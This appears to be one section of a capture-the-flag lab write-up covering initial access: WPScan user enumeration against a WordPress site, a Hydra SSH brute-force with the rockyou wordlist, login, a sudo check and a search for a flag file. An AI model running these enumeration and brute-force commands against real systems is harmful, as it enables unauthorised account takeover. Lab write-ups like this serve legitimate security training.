# 02 - Initial Access

## Username Enumeration

I enumerated the WordPress installation using WPScan.

```bash
wpscan --url http://<TARGET_IP>/wordpress -e u
```

The scan identified the following user.

```
michael
```

---

## Password Attack

I used Hydra to perform an SSH brute-force attack.

```bash
hydra -l michael -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
```

Hydra successfully recovered Michael's password.

---

## SSH Login

```bash
ssh michael@<TARGET_IP>
```

I successfully logged in as **michael**.

---

## Sudo Enumeration

I checked Michael's sudo permissions.

```bash
sudo -l
```

Michael did **not** have sudo privileges.

---

## Flag 2

I searched the filesystem.

```bash
find / -type f -iname "*flag*" 2>/dev/null
```

The second flag was located in:

```
/var/www
```
